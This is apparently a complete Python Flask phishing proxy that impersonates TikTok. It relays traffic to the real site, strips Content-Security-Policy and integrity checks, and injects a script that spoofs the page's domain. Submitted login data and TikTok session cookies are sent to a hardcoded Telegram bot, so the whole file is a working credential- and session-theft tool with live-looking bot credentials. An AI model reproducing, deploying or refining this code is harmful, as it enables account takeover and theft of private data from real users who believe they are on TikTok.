import os, re, urllib3, requests
from flask import Flask, request, make_response, redirect
from urllib.parse import urljoin
from werkzeug.middleware.proxy_fix import ProxyFix

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)

TOKEN = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"
CHAT_ID = "1367401179"

class P:
    def __init__(s):
        s.t = "www.tiktok.com"
        s.e = ['sessionid', 'sid_tt', 'uid_tt', 'ttwid', 'msToken', 'odin_tt']

    def n(s, m):
        try:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                          json={"chat_id": CHAT_ID, "text": m, "parse_mode": "HTML"}, timeout=5)
        except: pass

    def i(s, html, host):
        # تعديل الروابط وإزالة CSP
        html = html.replace(f'https://{s.t}', f'https://{host}')
        html = html.replace('www.tiktok.com', host)
        html = html.replace('Content-Security-Policy', 'X-Proxy-CSP')
        html = re.sub(r'integrity="[^"]+"', '', html)
        # حقن سكريبت لضبط سلوك التصفح
        script = f'''<script>
            (function() {{
                const origReplace = window.location.replace;
                window.location.replace = function(u) {{
                    if(u.includes('tiktok.com')) u = u.replace('www.tiktok.com', '{host}');
                    window.location.href = u;
                }};
                Object.defineProperty(document, 'domain', {{ get: function() {{ return '{s.t}'; }} }});
            }})();
        </script>'''
        return html.replace('<head>', f'<head>{script}')

p = P()

@app.route('/')
def home():
    return redirect('/login')

@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def proxy(path):
    host = request.headers.get('Host')
    dest = urljoin(f"https://{p.t}", path)
    if request.query_string:
        dest += '?' + request.query_string.decode()

    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
    headers['Host'] = p.t

    body = request.get_data()

    if request.method == 'POST':
        try:
            text_data = body.decode('utf-8', errors='ignore')
            if any(k in text_data.lower() for k in ['pass', 'user', 'login', 'email']):
                p.n(f"🎯 Data:\n<code>{text_data[:1000]}</code>")
        except: pass

    try:
        resp = requests.request(
            method=request.method,
            url=dest,
            headers=headers,
            cookies=request.cookies,
            data=body,
            allow_redirects=False,
            verify=False,
            timeout=30
        )

        # استخراج الجلسات
        ck = resp.cookies.get_dict()
        if 'sessionid' in ck:
            session_str = '; '.join([f"{k}={v}" for k, v in ck.items() if k in p.e])
            p.n(f"🔥 SESSION:\n<code>{session_str}</code>")

        # معالجة المحتوى
        content = resp.content
        if 'text/html' in resp.headers.get('Content-Type', ''):
            try:
                # فك الترميز وحقن السكريبت بأمان
                decoded = content.decode('utf-8', errors='ignore')
                content = p.i(decoded, host).encode()
            except Exception as e:
                print(f"HTML injection error: {e}")  # سجل الخطأ للمطور ولا تعرضه للمستخدم

        # بناء الرد
        flask_resp = make_response(content)
        flask_resp.status_code = resp.status_code

        for k, v in resp.headers.items():
            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'set-cookie']:
                flask_resp.headers[k] = v

        for k, v in resp.cookies.items():
            flask_resp.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=None)

        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '').replace(p.t, host)
            flask_resp.headers['Location'] = location

        return flask_resp

    except Exception as e:
        # تسجيل الخطأ في سجلات Render (يمكنك مشاهدتها من لوحة التحكم)
        print(f"Proxy critical error: {e}")
        return "Service Unavailable", 503

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
